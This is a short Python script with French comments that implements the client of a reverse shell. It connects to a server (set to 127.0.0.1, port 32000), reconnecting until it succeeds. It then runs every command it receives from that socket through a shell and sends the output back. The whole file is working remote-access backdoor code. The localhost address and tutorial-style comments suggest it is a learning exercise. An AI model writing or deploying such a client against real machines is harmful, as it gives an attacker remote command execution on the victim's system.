import socket
import time
import subprocess


HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")

while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP,HOST_PORT))
    except ConnectionRefusedError:
        print("Erreur : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecte au serveur")
        break

while True:   
    commande_data = s.recv(MAX_DATA_SIZE) # binaire
    if not commande_data:
        break
    commande = commande_data.decode()   # String
    print(f"Commande: {commande}") # affichage de la commande qu'on a tape
    resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True) # execution de la commande
    
    reponse = resultat.stdout + resultat.stderr
    
    if not reponse or len(reponse) == 0:    # pour gerer cd qui ne renvoie aucune reponse
        reponse = " "
    s.sendall(reponse.encode()) # envoie sous forme binaire
    
s.close()